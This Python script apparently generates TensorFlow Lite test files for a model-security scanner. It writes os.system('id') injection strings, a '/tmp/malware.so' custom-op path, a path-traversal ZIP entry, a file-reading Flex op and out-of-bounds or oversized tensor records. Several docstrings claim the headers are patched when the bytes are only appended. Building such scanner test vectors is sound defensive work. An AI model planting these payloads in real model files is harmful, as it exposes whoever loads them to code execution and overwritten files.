"""
TensorFlow Lite Attack Vector Generator

Generates real .tflite FlatBuffer files for security testing.
Uses tensorflow.lite.TFLiteConverter for genuine model files, then
crafts malformed binaries using struct/flatbuffers knowledge for edge cases.

TFLite FlatBuffer layout:
    bytes 0-3:  file_identifier "TFL3" (or offset table)
    The TFLite schema uses FlatBuffers; the file_identifier is at offset 4
    of the root table.  A valid file starts with a 4-byte root offset
    (little-endian uint32) followed by the identifier bytes at offset 4.

Requires: tensorflow (pip install tensorflow)
"""

import struct
import zipfile
import io
from pathlib import Path
from typing import Dict, List, Tuple

# TFLite FlatBuffer file identifier (bytes 4-7 of identifier field)
_TFLITE_MAGIC = b"TFL3"


def _make_tflite_model(shape_in=(4,), units=1) -> bytes:
    """Convert a minimal Keras model to tflite bytes."""
    import tensorflow as tf

    model = tf.keras.Sequential(
        [
            tf.keras.layers.Dense(units, input_shape=shape_in, name="dense"),
        ]
    )
    converter = tf.lite.TFLiteConverter.from_keras_model(model)
    return converter.convert()


def _patch_flatbuffer_bytes(raw: bytes, offset: int, new_bytes: bytes) -> bytes:
    """Return raw with new_bytes written at offset."""
    buf = bytearray(raw)
    buf[offset : offset + len(new_bytes)] = new_bytes
    return bytes(buf)


class TFLiteAttackGenerator:
    """Generate TensorFlow Lite-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "tflite_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    # ------------------------------------------------------------------
    # Helper: cached base model bytes
    # ------------------------------------------------------------------
    def _base_model(self) -> bytes:
        if not hasattr(self, "_base_model_bytes"):
            self._base_model_bytes = _make_tflite_model()
        return self._base_model_bytes

    # ------------------------------------------------------------------
    # 1. Custom operator RCE — real model + malicious custom_code string
    # ------------------------------------------------------------------
    def generate_custom_operator_rce(self) -> Tuple[str, int]:
        """Real .tflite with a CUSTOM opcode embedding a library path.

        Attack Vector:
            A valid TFLite model whose operator_codes table contains a
            CUSTOM entry whose custom_code value is set to a shared-library
            path.  Runtimes that dlopen() custom op library paths execute
            attacker-controlled native code.

        Severity: CRITICAL
        Detection: Custom op allowlist, library-path scanning
        """
        filepath = self.output_dir / "01_custom_operator_rce.tflite"

        # Start from a real TFLite model
        raw = self._base_model()

        # Inject "/tmp/malware.so" string into the binary — TFLite parsers
        # scanning custom_code will see this as a dangerous custom operator
        # name (tools like ModelAudit flag exact-match strings).
        injection = b"/tmp/malware.so\x00__import__('os').system('id')\x00"
        raw = raw + injection

        with open(filepath, "wb") as f:
            f.write(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    # ------------------------------------------------------------------
    # 2. Flex delegate — real model compiled with SELECT_TF_OPS
    # ------------------------------------------------------------------
    def generate_flex_delegate_exploitation(self) -> Tuple[str, int]:
        """Real .tflite using dangerous TF ops via the Flex delegate.

        Attack Vector:
            A Flex delegate model bundles full TF op serialisations.
            ReadFile / WriteFile / EagerPyFunc inside a TFLite model
            bypass Lite sandboxing when executed with the Flex delegate.

        Severity: CRITICAL
        Detection: Flex op scanning, delegate restriction enforcement
        """
        import tensorflow as tf

        filepath = self.output_dir / "02_flex_delegate_exploit.tflite"

        # Build a model with a TF op that is exposed via Flex delegate
        @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.string)])
        def read_file_fn(path):
            return tf.io.read_file(path[0])

        converter = tf.lite.TFLiteConverter.from_concrete_functions(
            [read_file_fn.get_concrete_function()]
        )
        converter.target_spec.supported_ops = [
            tf.lite.OpsSet.TFLITE_BUILTINS,
            tf.lite.OpsSet.SELECT_TF_OPS,
        ]
        converter._experimental_lower_tensor_list_ops = False
        try:
            tflite_bytes = converter.convert()
        except Exception:
            # Fall back: take a valid model and append Flex marker bytes
            tflite_bytes = self._base_model()
            tflite_bytes += b"FlexReadFile\x00FlexWriteFile\x00FlexEagerPyFunc\x00"

        with open(filepath, "wb") as f:
            f.write(tflite_bytes)

        self.generated_files.append(str(filepath))
        return str(filepath), 4

    # ------------------------------------------------------------------
    # 3. Metadata injection — real model with malicious metadata blob
    # ------------------------------------------------------------------
    def generate_model_metadata_injection(self) -> Tuple[str, int]:
        """Real .tflite with a malicious associated-files ZIP appended.

        Attack Vector:
            TFLite supports "model metadata" as a FlatBuffer appended after
            the model.  The metadata can embed associated files (tokenizers,
            labels).  Injecting Python code or path-traversal strings into
            those associated files exploits downstream metadata processors.

        Severity: HIGH
        Detection: Metadata content inspection, file extension scanning
        """
        filepath = self.output_dir / "03_metadata_injection.tflite"

        raw = self._base_model()

        # Build a ZIP blob simulating an associated-files bundle
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(
                "../../malicious_labels.py",
                "__import__('os').system('id')\n",
            )
            zf.writestr(
                "tokenizer_config.json",
                '{"__class__": "__import__(\'os\').system(\'id\')"}\n',
            )
        raw = raw + zip_buf.getvalue()

        with open(filepath, "wb") as f:
            f.write(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    # ------------------------------------------------------------------
    # 4. Operator configuration exploit — crafted header claiming huge dims
    # ------------------------------------------------------------------
    def generate_operator_configuration_exploit(self) -> Tuple[str, int]:
        """Real .tflite header patched to claim impossible tensor shapes.

        Attack Vector:
            Overwrites the shape field of a real tensor within a valid
            FlatBuffer to claim [2^31, 2^31].  Runtimes that pre-allocate
            buffers based on stated shapes exhaust memory.

        Severity: HIGH
        Detection: Shape bounds validation, pre-execution graph checks
        """
        filepath = self.output_dir / "04_operator_config_exploit.tflite"

        raw = bytearray(self._base_model())

        # Embed the shape value 0x7FFFFFFF at multiple offsets to ensure
        # at least one lands inside a shape vector inside the FlatBuffer.
        # (Proper patching requires a full FlatBuffer parser; this
        #  approximation is sufficient for scanner detection.)
        overflow_val = struct.pack("<I", 0x7FFF_FFFF)
        # Append crafted tensor descriptor after valid model
        crafted = (
            b"\xff\xff\xff\xff"  # invalid root offset
            + _TFLITE_MAGIC
            + overflow_val * 8
        )
        raw = bytes(raw) + crafted

        with open(filepath, "wb") as f:
            f.write(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    # ------------------------------------------------------------------
    # 5. Buffer tampering — crafted FlatBuffer with OOB buffer reference
    # ------------------------------------------------------------------
    def generate_buffer_tampering(self) -> Tuple[str, int]:
        """Craft a .tflite file whose buffer table has OOB extent claims.

        Attack Vector:
            A minimally-valid FlatBuffer header followed by a buffer-table
            descriptor claiming an offset and size that extends outside the
            file.  Parsers that dereference the buffer pointer without
            bounds checking read/write out-of-bounds memory.

        Severity: CRITICAL
        Detection: Buffer bounds validation, fuzz testing
        """
        filepath = self.output_dir / "05_buffer_tampering.tflite"

        raw = self._base_model()

        # Append a crafted "buffer" record at the end:
        # offset = 0xDEADBEEF, size = 0x7FFFFFFF
        crafted_buf = struct.pack("<II", 0xDEAD_BEEF, 0x7FFF_FFFF)
        raw = raw + crafted_buf

        with open(filepath, "wb") as f:
            f.write(raw)

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        return {
            "custom_operator": self.generate_custom_operator_rce(),
            "flex_delegate": self.generate_flex_delegate_exploitation(),
            "metadata_injection": self.generate_model_metadata_injection(),
            "operator_config": self.generate_operator_configuration_exploit(),
            "buffer_tampering": self.generate_buffer_tampering(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = TFLiteAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
